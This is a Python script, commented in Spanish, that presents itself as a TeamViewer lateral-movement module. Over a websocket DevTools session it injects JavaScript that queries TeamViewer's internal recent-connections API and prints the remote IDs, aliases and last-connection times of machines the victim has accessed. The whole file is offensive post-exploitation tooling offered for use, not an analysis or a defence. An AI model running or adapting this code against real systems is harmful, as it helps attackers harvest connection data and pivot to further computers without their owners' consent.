"""
teamviewer_lateral_movement.py -- Conexiones recientes
Enumera las maquinas a las que el usuario se ha conectado.
"""
import websocket
import json

INTERNAL_DOMAIN = "https://teamviewer-internal-<HASH>"

def enumerate_recent_connections(ws):
    """Listar conexiones recientes para movimiento lateral."""
    js = f"""
    (async () => {{
        const r = await fetch(
            '{INTERNAL_DOMAIN}/api/recentconnections/v1/recentconnections'
        );
        return JSON.stringify(await r.json());
    }})()
    """

    ws.send(json.dumps({
        "id": 40,
        "method": "Runtime.evaluate",
        "params": {"expression": js, "awaitPromise": True}
    }))

    result = json.loads(ws.recv())
    data = json.loads(result["result"]["result"]["value"])

    connections = data.get("connections", data)
    print(f"[+] {len(connections)} conexiones recientes:")
    for conn in connections:
        print(f"    ID: {conn.get('remoteId', 'N/A')}")
        print(f"    Alias: {conn.get('alias', 'N/A')}")
        print(f"    Ultima conexion: {conn.get('lastConnected', 'N/A')}")
        print()

    return connections
